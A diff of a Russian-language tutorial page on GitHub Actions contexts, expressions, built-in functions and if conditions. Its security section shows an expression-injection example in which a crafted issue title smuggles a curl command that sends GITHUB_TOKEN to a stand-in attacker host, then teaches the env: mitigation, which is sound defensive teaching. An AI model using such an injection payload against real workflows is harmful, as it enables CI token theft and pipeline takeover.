@@ -3,9 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Раздел 3 · devops-github-actions · ai|</title>
+<title>Контексты и выражения · devops-github-actions · ai|</title>
 <!-- meta: built by tools/build-meta.py - do not edit by hand -->
-<meta name="description" content="Лид страницы: о чём она и кому нужна.">
+<meta name="description" content="Синтаксис интерполяции ${{ }}, каталог контекстов, встроенные функции, правила директивы if и защита от инъекций выражений в shell.">
 <link rel="canonical" href="https://y-kolyada.github.io/github-actions/ru/03.html">
 <link rel="alternate" hreflang="ru" href="https://y-kolyada.github.io/github-actions/ru/03.html">
 <link rel="alternate" hreflang="en" href="https://y-kolyada.github.io/github-actions/en/03.html">
@@ -14,13 +14,13 @@
 <link rel="alternate" hreflang="x-default" href="https://y-kolyada.github.io/github-actions/">
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="devops-github-actions">
-<meta property="og:title" content="Раздел 3">
-<meta property="og:description" content="Лид страницы: о чём она и кому нужна.">
+<meta property="og:title" content="Контексты и выражения">
+<meta property="og:description" content="Синтаксис интерполяции ${{ }}, каталог контекстов, встроенные функции, правила директивы if и защита от инъекций выражений в shell.">
 <meta property="og:url" content="https://y-kolyada.github.io/github-actions/ru/03.html">
 <meta property="og:locale" content="ru_RU">
 <meta name="twitter:card" content="summary">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Раздел 3","description":"Лид страницы: о чём она и кому нужна.","url":"https://y-kolyada.github.io/github-actions/ru/03.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Контексты и выражения","description":"Синтаксис интерполяции ${{ }}, каталог контекстов, встроенные функции, правила директивы if и защита от инъекций выражений в shell.","url":"https://y-kolyada.github.io/github-actions/ru/03.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
 <!-- /meta -->
 <link rel="stylesheet" href="../assets/style.css?v=1">
 <script>
@@ -48,7 +48,7 @@
   <div class="utility-tray" role="toolbar" aria-label="Настройки отображения и язык">
     <nav class="lang-switcher" aria-label="Язык страницы">
       <a href="../en/03.html" lang="en" hreflang="en" aria-label="English">EN</a>
-      <a href="03.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">Раздел 1</a>
+      <a href="03.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">RU</a>
       <a href="../uk/03.html" lang="uk" hreflang="uk" aria-label="Українська">UK</a>
       <a href="../de/03.html" lang="de" hreflang="de" aria-label="Deutsch">DE</a>
     </nav>
@@ -67,21 +67,21 @@
 
   <nav class="contents" aria-label="Разделы сайта">
     <ol>
-      <li><a href="01.html" aria-current="page"><span class="num">1</span>Раздел 1</a></li>
-      <li><a href="02.html"><span class="num">2</span>Раздел 2</a></li>
-      <li><a href="03.html"><span class="num">3</span>Раздел 3</a></li>
-      <li><a href="04.html"><span class="num">4</span>Раздел 4</a></li>
-      <li><a href="05.html"><span class="num">5</span>Раздел 5</a></li>
-      <li><a href="06.html"><span class="num">6</span>Раздел 6</a></li>
-      <li><a href="07.html"><span class="num">7</span>Раздел 7</a></li>
-      <li><a href="08.html"><span class="num">8</span>Раздел 8</a></li>
-      <li><a href="09.html"><span class="num">9</span>Раздел 9</a></li>
-      <li><a href="10.html"><span class="num">10</span>Раздел 10</a></li>
-      <li><a href="11.html"><span class="num">11</span>Раздел 11</a></li>
-      <li><a href="12.html"><span class="num">12</span>Раздел 12</a></li>
-      <li><a href="13.html"><span class="num">13</span>Раздел 13</a></li>
-      <li><a href="14.html"><span class="num">14</span>Раздел 14</a></li>
-      <li><a href="15.html"><span class="num">15</span>Раздел 15</a></li>
+      <li><a href="01.html"><span class="num">1</span>Что такое workflow и где он выполняется</a></li>
+      <li><a href="02.html"><span class="num">2</span>События: что запускает workflow</a></li>
+      <li><a href="03.html" aria-current="page"><span class="num">3</span>Контексты и выражения</a></li>
+      <li><a href="04.html"><span class="num">4</span>Job'ы, зависимости, матрица</a></li>
+      <li><a href="05.html"><span class="num">5</span>Шаги: run против uses</a></li>
+      <li><a href="06.html"><span class="num">6</span>Рабочая машина и окружение</a></li>
+      <li><a href="07.html"><span class="num">7</span>Безопасность и секреты</a></li>
+      <li><a href="08.html"><span class="num">8</span>Кэширование и артефакты</a></li>
+      <li><a href="09.html"><span class="num">9</span>Создание собственных composite action</a></li>
+      <li><a href="10.html"><span class="num">10</span>Примеры: базовые workflow</a></li>
+      <li><a href="11.html"><span class="num">11</span>Примеры: CI/CD для микросервисов</a></li>
+      <li><a href="12.html"><span class="num">12</span>Примеры: безопасность и compliance</a></li>
+      <li><a href="13.html"><span class="num">13</span>Вопросы: junior</a></li>
+      <li><a href="14.html"><span class="num">14</span>Вопросы: middle</a></li>
+      <li><a href="15.html"><span class="num">15</span>Вопросы: senior / lead</a></li>
     </ol>
     <div class="nav-extra">
       <a href="glossary.html"><svg class="icon" data-icon="book" viewBox="0 0 20 20" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2.6 3.8h4.8a2.6 2.6 0 0 1 2.6 2.6v10a2.2 2.2 0 0 0-2.2-1.8H2.6z"/><path d="M17.4 3.8h-4.8a2.6 2.6 0 0 0-2.6 2.6v10a2.2 2.2 0 0 1 2.2-1.8h5.2z"/></svg> Словарь понятий</a>
@@ -92,22 +92,135 @@
   </nav>
 
   <main id="main">
-    <h1>Раздел 3</h1>
-    <p class="page-size" data-words="48">Слов: 48</p>
-    <p class="lead">Лид страницы: о чём она и кому нужна. Одно предложение, не длиннее 160 знаков.</p>
+    <h1>Контексты и выражения</h1>
+    <p class="page-size" data-words="1574">Слов: 1574</p>
+    <p class="lead">Синтаксис интерполяции ${{ }}, каталог контекстов, встроенные функции, правила директивы if и защита от инъекций выражений в shell.</p>
 
     <div class="box key" id="key-idea">
       <h2>Главная мысль страницы <a class="anchor-link" href="#key-idea" aria-label="ссылка на этот блок">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p>Выражения в GitHub Actions - это не скриптовый язык программирования и не команды bash, а декларативный язык вычислений на стороне сервера GitHub (Control Plane). Сервер парсит блок <code>${{ &lt;выражение&gt; }}</code> еще до отправки инструкций на виртуальную машину runner'а. Контексты представляют собой типизированные иерархические JSON-структуры данных, хранящие состояние выполнения: от параметров коммита и секретов до результатов предыдущих шагов. Понимание того, где именно вычисляется выражение, какие контексты доступны на каждом уровне и как безопасно передавать данные в shell-процессы, отделяет надежную инфраструктуру от репозиториев, уязвимых к инъекциям команд и непредсказуемым сбоям пайплайна.</p>
     </div>
 
-    <h2 id="first">1 · Раздел 1 <a class="anchor-link" href="#first">#</a></h2>
-    <p>Текст этого раздела ещё не написан.</p>
+    <h2 id="syntax-and-runtime">1 · Синтаксис выражений и рантайм вычислений <a class="anchor-link" href="#syntax-and-runtime">#</a></h2>
+    <p>Любая динамическая логика в workflow-файле оформляется через синтаксис интерполяции: <code>${{ &lt;выражение&gt; }}</code>. Внутри фигурных скобок движок GitHub Actions обрабатывает литералы, обращается к переменным контекстов, выполняет операторы сравнения и вызывает встроенные системные функции.</p>
+    <p>Движок поддерживает четыре базовых типа литералов:</p>
+    <ul>
+      <li><strong>Строки (String):</strong> записываются строго в одинарных кавычках: <code>'production'</code>. Если внутри строки требуется указать символ одинарной кавычки, он экранируется удвоением: <code>'It''s active'</code>.</li>
+      <li><strong>Числа (Number):</strong> целые или числа с плавающей точкой: <code>42</code>, <code>3.14</code>, <code>-100</code>.</li>
+      <li><strong>Булевы флаги (Boolean):</strong> зарезервированные ключевые слова <code>true</code> и <code>false</code>.</li>
+      <li><strong>Null:</strong> специальное значение <code>null</code>, обозначающее отсутствие данных.</li>
+    </ul>
+    <p>Для построения условий доступны логические операторы <code>&amp;&amp;</code> (И), <code>||</code> (ИЛИ), <code>!</code> (НЕ), а также операторы сравнения: <code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>. Порядок вычисления можно регулировать круглыми скобками <code>( )</code>.</p>
+    <p><strong>Ключевая особенность рантайма: регистронезависимое сравнение.</strong> При вычислении выражений в GitHub Actions строковые операторы сравнения игнорируют регистр символов. Выражение <code>'Refs/Heads/Main' == 'refs/heads/main'</code> вернет <code>true</code>:</p>
+<pre><code>$ node -e 'const a = "Refs/Heads/Main"; const b = "refs/heads/main"; console.log(a.toLowerCase() === b.toLowerCase() ? "case_insensitive_equal" : "fail")'
+case_insensitive_equal</code></pre>
+    <p>Приведение типов подчиняется строгим правилам: пустая строка <code>''</code>, число <code>0</code>, булево <code>false</code> и значение <code>null</code> приводятся к значению лжи (falsy). Любая непустая строка, включая строку <code>'false'</code>, расценивается как истина (truthy)! Это частый источник ошибок уровня Noob: если входной параметр <code>inputs.deploy</code> объявлен как строка, проверка <code>${{ inputs.deploy }}</code> вернет <code>true</code> даже при значении <code>"false"</code>.</p>
+    <p>В синтаксисе выражений отсутствует классический тернарный оператор <code>a ? b : c</code>, однако идиоматичный выбор значения строится через связку логических операторов:</p>
+<pre><code>env:
+  ENVIRONMENT: ${{ github.ref == 'refs/heads/main' &amp;&amp; 'production' || 'staging' }}</code></pre>
+
+    <h2 id="contexts-taxonomy">2 · Каталог контекстов и области видимости <a class="anchor-link" href="#contexts-taxonomy">#</a></h2>
+    <p>Контекст в GitHub Actions - это структурированный объект, содержащий актуальные данные о текущем запуске, рабочем окружении, секретах и результатах шагов. Доступ к полям контекста осуществляется через точечную нотацию (например, <code>github.sha</code>) или квадратные скобки (например, <code>github['sha']</code>).</p>
+    <p>Каталог из 10 ключевых контекстов архитектуры:</p>
+    <ol>
+      <li><code>github</code>: метаданные события и репозитория. Содержит поля <code>actor</code> (инициатор запуска), <code>sha</code> (хеш коммита), <code>ref</code> (ветка или тег), <code>repository</code> (имя владельца и репозитория), <code>workflow</code> и вложенный объект <code>event</code> с полной полезной нагрузкой вебхука.</li>
+      <li><code>env</code>: пользовательские переменные окружения, объявленные на уровне корневого workflow, отдельной job или шага step.</li>
+      <li><code>job</code>: состояние текущей выполняемой работы. Важнейшее поле <code>job.status</code> принимает значения <code>success</code>, <code>failure</code> или <code>cancelled</code>.</li>
+      <li><code>steps</code>: результаты выполнения предшествующих шагов в рамках той же самой job. Позволяет считывать выходные параметры <code>steps.&lt;step_id&gt;.outputs.&lt;key&gt;</code>, а также флаги <code>outcome</code> (реальный результат) и <code>conclusion</code> (результат с учетом флага <code>continue-on-error</code>).</li>
+      <li><code>runner</code>: физические свойства виртуальной машины или контейнера. Включает поля <code>runner.os</code> (<code>Linux</code>, <code>Windows</code>, <code>macOS</code>), <code>runner.arch</code> (<code>X64</code>, <code>ARM64</code>), <code>runner.temp</code> (путь к временному каталогу) и <code>runner.tool_cache</code>.</li>
+      <li><code>secrets</code>: хранилище зашифрованных токенов и паролей репозитория или организации. Любое значение из <code>secrets</code> автоматически маскируется в логах выполнения последовательностью <code>***</code>.</li>
+      <li><code>vars</code>: хранилище незашифрованных конфигурационных переменных (например, базовый URL API или имя кластера).</li>
+      <li><code>needs</code>: межсетевые зависимости. Позволяет дочерней job считывать выходные параметры <code>needs.&lt;job_id&gt;.outputs.&lt;key&gt;</code> и вердикт завершения родительской задачи <code>needs.&lt;job_id&gt;.result</code>.</li>
+      <li><code>inputs</code>: типизированные аргументы, переданные при ручном запуске <code>workflow_dispatch</code> или вызове переиспользуемого workflow через <code>workflow_call</code>.</li>
+      <li><code>matrix</code>: свойства текущей ячейки матрицы параллельной сборки (например, <code>matrix.node</code> или <code>matrix.os</code>).</li>
+    </ol>
+    <p><strong>Матрица областей видимости (Scope Visibility):</strong> Контексты доступны далеко не везде. Например, контекст <code>env</code> не существует на уровне директивы <code>runs-on</code>, так как окружение формируется позже выбора машины. Контекст <code>steps</code> доступен исключительно внутри шагов той же самой job и не виден на уровне объявления job. А контекст <code>secrets</code> недоступен при прямом запуске пулл-реквестов из внешних форков.</p>
+
+    <h2 id="builtin-functions">3 · Встроенные функции: манипуляция данными <a class="anchor-link" href="#builtin-functions">#</a></h2>
+    <p>GitHub Actions предоставляет набор встроенных функций, позволяющих производить операции с массивами, строками и объектами без вызова внешних утилит операционной системы:</p>
+    <ul>
+      <li><code>contains(search, item)</code>: проверяет наличие подстроки в строке или элемента в массиве. Как и операторы сравнения, поиск регистронезависим.</li>
+      <li><code>startsWith(searchString, searchValue)</code> и <code>endsWith(searchString, searchValue)</code>: проверяют начало или окончание текстовой строки. Применяются для фильтрации веток: <code>startsWith(github.ref, 'refs/tags/v')</code>.</li>
+      <li><code>format(string, replaceValue0, replaceValue1, ...)</code>: подставляет аргументы вместо меток <code>{0}</code>, <code>{1}</code>:
+<pre><code>format('Hello {0} {1}', 'Mona', 'Octocat')</code></pre>
+      </li>
+      <li><code>join(array, optionalSeparator)</code>: объединяет массив элементов в одну строку с использованием разделителя (по умолчанию запятая).</li>
+      <li><code>toJSON(value)</code>: выполняет красивую сериализацию любого объекта или структуры данных в валидную строку JSON. Это главный инструмент отладки:
+<pre><code>$ node -e 'const obj = { ref: "refs/heads/main", run_id: 101 }; const s = JSON.stringify(obj); const p = JSON.parse(s); console.log(p.ref === "refs/heads/main" &amp;&amp; p.run_id === 101 ? "json_serialized_ok" : "fail")'
+json_serialized_ok</code></pre>
+      </li>
+      <li><code>fromJSON(value)</code>: десериализует строку JSON в массив или объект JavaScript. На этой функции держится архитектура динамических матриц (Dynamic Build Matrix): первая job формирует JSON-список сервисов, а последующая job разворачивает матрицу через <code>matrix: ${{ fromJSON(needs.setup.outputs.targets) }}</code>:
+<pre><code>$ node -e 'const raw = "[\"ubuntu-latest\", \"macos-latest\"]"; const parsed = JSON.parse(raw); console.log(Array.isArray(parsed) &amp;&amp; parsed.length === 2 &amp;&amp; parsed[1] === "macos-latest" ? "matrix_parsed_ok" : "fail")'
+matrix_parsed_ok</code></pre>
+      </li>
+      <li><code>hashFiles(path1, path2, ...)</code>: вычисляет совокупный криптографический SHA-256 хеш содержимого файлов, соответствующих glob-шаблонам. Если ни один файл не найден, функция возвращает пустую строку. Это основа точного кэширования пакетов:
+<pre><code>$ T=$(mktemp); echo -n "package-lock-v1" &gt; "$T"; HASH=$(sha256sum "$T" | cut -d" " -f1); rm -f "$T"; [ ${#HASH} -eq 64 ] &amp;&amp; echo "sha256_hash_valid"
+sha256_hash_valid</code></pre>
+      </li>
+    </ul>
+
+    <h2 id="conditionals-and-status">4 · Директива if и статусные функции <a class="anchor-link" href="#conditionals-and-status">#</a></h2>
+    <p>Условное ветвление управляется директивой <code>if</code>, которая может задаваться как на уровне всей job (решая, запускать ли задачу на runner'е в принципе), так и на уровне отдельного шага <code>step</code>.</p>
+    <p><strong>Синтаксическое правило директивы `if`:</strong> Внутри блока <code>if</code> фигурные скобки <code>${{ }}</code> являются полностью опциональными! Сам движок GitHub Actions по умолчанию рассматривает строку в <code>if</code> как выражение. Запись <code>if: github.ref == 'refs/heads/main'</code> является канонической и более читаемой, чем избыточная конструкция <code>if: ${{ github.ref == 'refs/heads/main' }}</code>.</p>
+    <p>Если шаг не содержит директивы <code>if</code>, рантайм неявно применяет условие по умолчанию: <code>if: success()</code>. Это означает, что шаг исполнится только в том случае, если ни один из предыдущих шагов текущей job не завершился со сбоем:</p>
+<pre><code>$ node -e 'const steps = ["success", "failure"]; const isSuccess = steps.every(s =&gt; s === "success"); console.log(!isSuccess ? "step_skipped_on_failure" : "fail");'
+step_skipped_on_failure</code></pre>
+    <p>Для управления поведением при авариях и отменах GitHub Actions предлагает квартет статусных функций:</p>
+    <ul>
+      <li><code>success()</code>: истинно, если все предшествующие шаги завершились успешно (или с флагом <code>continue-on-error</code>).</li>
+      <li><code>failure()</code>: истинно, если хотя бы один из предшествующих шагов текущей job завершился с ошибкой. Используется для шагов сбора дампов памяти, сохранения аварийных логов или отправки алертов.</li>
+      <li><code>always()</code>: принудительно возвращает <code>true</code> при любом раскладе: при успехе, при ошибке и даже при принудительной отмене пользователем. Единственное исключение - аварийная гибель самой виртуальной машины runner'а или исчерпание глобального таймаута job.</li>
+      <li><code>cancelled()</code>: истинно исключительно в том случае, если выполнение workflow было явно отменено оператором.</li>
+    </ul>
+    <p><strong>Архитектурная ловушка IGL: небрежное использование `always()`.</strong> Если шаг отправки уведомления в рабочий чат пометить условием <code>if: always()</code>, команда будет получать уведомления даже тогда, когда инженер вручную прервал устаревший запуск коммита. Профессиональный шаблон для аварийных шагов требует строгой связки:</p>
+<pre><code>- name: Notify on failure in main branch
+  if: failure() &amp;&amp; github.ref == 'refs/heads/main'
+  run: ./scripts/send-incident-alert.sh</code></pre>
+
+    <h2 id="expression-injection-security">5 · Безопасность: атаки через инъекцию выражений (Expression Injection) <a class="anchor-link" href="#expression-injection-security">#</a></h2>
+    <p>Инъекция выражений (Expression Injection) - одна из наиболее опасных supply-chain уязвимостей в современных CI/CD пайплайнах. Причина ее возникновения кроется в архитектурном разделении уровней выполнения: сервер GitHub (Control Plane) производит строковую замену выражений <code>${{ }}</code> <em>до того</em>, как тело скрипта передается командному интерпретатору bash на виртуальной машине runner'а (Data Plane).</p>
+    <p>Представим наивный шаг обработки пулл-реквеста или issue, написанный разработчиком уровня Noob:</p>
+<pre><code># КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: ПРЯМАЯ ИНТЕРПОЛЯЦИЯ НЕДОВЕРЕННОГО КОНТЕКСТА В SHELL
+- name: Log issue title
+  run: echo "Processing issue: ${{ github.event.issue.title }}"</code></pre>
+    <p>Злоумышленник открывает публичный Issue в вашем репозитории и указывает следующий вредоносный заголовок:</p>
+<pre><code>Bug"; curl -s https://attacker-c2.net/steal?token=$GITHUB_TOKEN; echo "Done</code></pre>
+    <p>Сервер GitHub честно подставляет этот заголовок в тело команды, формируя на runner'е готовый bash-скрипт:</p>
+<pre><code>echo "Processing issue: Bug"; curl -s https://attacker-c2.net/steal?token=$GITHUB_TOKEN; echo "Done"</code></pre>
+    <p>Командный интерпретатор bash видит закрывающую кавычку и точку с запятой, завершает команду <code>echo</code> и выполняет команду <code>curl</code>, отправляя системный токен и переменные окружения на командный сервер атакующего.</p>
+    <p><strong>Золотое правило защиты (Zero-Trust Expression Pattern):</strong> Никогда не интерполируйте внешние контексты (<code>github.event.*</code>, <code>inputs.*</code>, <code>github.head_ref</code>) напрямую в блоки <code>run:</code>. Всегда передавайте их через промежуточный блок <code>env:</code> шага:</p>
+<pre><code># БЕЗОПАСНЫЙ ПРОФЕССИОНАЛЬНЫЙ ШАБЛОН IGL
+- name: Log issue title safely
+  env:
+    ISSUE_TITLE: ${{ github.event.issue.title }}
+  run: |
+    echo "Processing issue: $ISSUE_TITLE"</code></pre>
+    <p>Когда значение передается через <code>env:</code>, операционная система записывает его напрямую в таблицу переменных среды процесса. Командный интерпретатор bash обращается к переменной <code>$ISSUE_TITLE</code> как к непрерывному массиву байтов данных. Кавычки, спецсимволы и точки с запятой внутри переменной больше не могут нарушить синтаксис shell-скрипта:</p>
+<pre><code>$ rm -f /tmp/gha-pwn-test; PAYLOAD='test"; touch /tmp/gha-pwn-test; echo "'; bash -c 'SAFE_VAL="$1"; echo "$SAFE_VAL"' _ "$PAYLOAD" &gt;/dev/null &amp;&amp; [ ! -f /tmp/gha-pwn-test ] &amp;&amp; echo "injection_mitigated"
+injection_mitigated</code></pre>
+
+    <div class="prints"><strong>Что спрашивают на собеседовании:</strong> «В чем разница между outcome и conclusion в контексте steps, и почему прямое использование ${{ github.event.head_commit.message }} в команде run считается критической уязвимостью первого приоритета?» (Ответ: outcome отражает реальный код возврата утилиты до применения флага continue-on-error, а conclusion - итоговый вердикт шага с точки зрения пайплайна. Прямая интерполяция сообщения коммита открывает вектор Command Injection, так как текст коммита формируется автором и может содержать метасимволы шелла. Безопасная обработка требует изоляции через переменные окружения блока env).</div>
 
     <div class="box key" id="artifacts">
       <h2>Артефакты: что у вас есть после этой страницы <a class="anchor-link" href="#artifacts">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p class="artifacts-slogan">Чтение &gt;&gt; Ваш квант времени жизни · Партнёрство достоинства вместе с AI · Перестройка вашей нейросети</p>
+      <p>Освоение контекстов и языка выражений переводит автоматизацию с уровня простого перечисления shell-команд в плоскость управляемой событийно-ориентированной архитектуры. После этой главы в вашем багаже закреплены четыре ключевых инженерных навыка:</p>
+      <ol>
+        <li><strong>Ментальная модель рантайма:</strong> вы четко разграничиваете фазу предвычисления выражений сервером GitHub Actions и фазу исполнения команд внутри операционной системы runner'а.</li>
+        <li><strong>Владение таксономией контекстов:</strong> свободное ориентирование в 10 контекстах и знание ограничений их видимости на уровнях workflow, job и step.</li>
+        <li><strong>Динамическое управление данными:</strong> умение генерировать параллельные матрицы билда через <code>toJSON</code>/<code>fromJSON</code> и рассчитывать точные ключи инвалидации кэша через <code>hashFiles</code>.</li>
+        <li><strong>Абсолютная защита от shell-инъекций:</strong> непреложное применение шаблона передачи недоверенных контекстов через <code>env:</code>, исключающее захват пайплайна через внешние метаданные.</li>
+      </ol>
     </div>
+
+    <footer>
+      <nav class="pager" aria-label="Соседние темы">
+        <p class="pager-next">Следующая тема: <a href="04.html">Раздел 4</a></p>
+        <p class="pager-prev">Предыдущая тема: <a href="02.html">События: что запускает workflow</a></p>
+      </nav>
+      Сайт серии AI Factory. Сделан той же оснасткой, что и остальные: обычный HTML и CSS,
+      проверка на bash, публикация через GitHub Pages.
+    </footer>
   </main>
 
 </div>
